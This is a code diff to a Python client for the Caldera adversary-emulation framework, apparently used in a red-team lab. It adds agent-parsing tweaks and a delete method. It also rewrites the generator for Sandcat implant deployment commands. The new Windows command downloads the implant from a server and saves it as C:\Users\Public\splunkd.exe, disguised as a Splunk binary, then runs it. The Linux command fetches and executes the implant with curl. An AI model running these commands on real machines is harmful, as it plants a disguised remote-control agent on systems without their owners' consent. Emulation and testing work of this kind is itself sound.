@@ -1,6 +1,7 @@
 
 import os
 import logging
+import re
 from urllib.parse import urlparse, urlunparse
 from typing import Any
 
@@ -91,12 +92,16 @@ class CalderaClient:
         ip = (
             agent.get("host_ip_addrs")
             or agent.get("host_ip")
+            or agent.get("host_ipv4")
+            or agent.get("host_address")
             or agent.get("ip")
             or agent.get("address")
             or ""
         )
         if isinstance(ip, list):
             ip = ", ".join(str(item) for item in ip if item)
+        else:
+            ip = ", ".join(re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", str(ip))) or str(ip or "")
 
         return {
             "paw": agent.get("paw"),
@@ -109,6 +114,7 @@ class CalderaClient:
             "trusted": trusted,
             "alive": self._agent_is_alive(agent),
             "status": "Online" if self._agent_is_alive(agent) else "Offline",
+            "raw": agent,
         }
 
     def get_agents_normalized(self):
@@ -125,6 +131,9 @@ class CalderaClient:
             for agent in self.get_agents_normalized()
             if agent.get("trusted") and agent.get("alive") and agent.get("paw")
         ]
+
+    def delete_agent(self, paw):
+        return self._request("DELETE", f"/api/v2/agents/{paw}")
 
     def list_operations(self):
         return self._request("GET", "/api/v2/operations")
@@ -269,13 +278,8 @@ class CalderaClient:
             elif isinstance(payload, dict):
                 names.append(payload.get("name") or payload.get("file") or payload.get("payload") or "")
 
-        preferred = ["sandcat.go", "sandcat.exe"] if "win" in str(platform).lower() else ["sandcat.go", "sandcat"]
-        for candidate in preferred:
-            if candidate in names:
-                return candidate
-        for name in names:
-            if "sandcat" in str(name).lower():
-                return name
+        if "sandcat.go" in names:
+            return "sandcat.go"
         return "sandcat.go"
 
     def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
@@ -289,24 +293,26 @@ class CalderaClient:
                 "to an address reachable from the victim VM before deploying Sandcat."
             )
         payload_name = self._sandcat_payload_name(platform)
-        key_part = f" -k {self.api_key}" if self.api_key else ""
 
         if "win" in str(platform or "").lower():
             return (
-                "powershell -ExecutionPolicy Bypass -NoProfile -Command "
-                f"\"$server='{server}'; "
-                "$url=$server + '/file/download'; "
-                "$wc=New-Object System.Net.WebClient; "
-                f"$wc.Headers.Add('file','{payload_name}'); "
-                "$wc.Headers.Add('platform','windows'); "
-                "$wc.DownloadFile($url,'sandcat.exe'); "
-                f".\\sandcat.exe -server {server} -group {group}{key_part}\""
+                f"$server=\"{server}\";\n"
+                "$url=\"$server/file/download\";\n"
+                "$wc=New-Object System.Net.WebClient;\n"
+                "$wc.Headers.add(\"platform\",\"windows\");\n"
+                f"$wc.Headers.add(\"file\",\"{payload_name}\");\n"
+                "$data=$wc.DownloadData($url);\n"
+                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;\n"
+                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;\n"
+                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;\n"
+                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\""
             )
 
         return (
-            f"server='{server}'; "
-            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
-            f"chmod +x sandcat; ./sandcat -server {server} -group {group}{key_part}"
+            f"server='{server}'\n"
+            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat\n"
+            f"chmod +x sandcat\n"
+            f"./sandcat -server \"$server\" -group {group}"
         )
 
     def get_adversary_list(self):
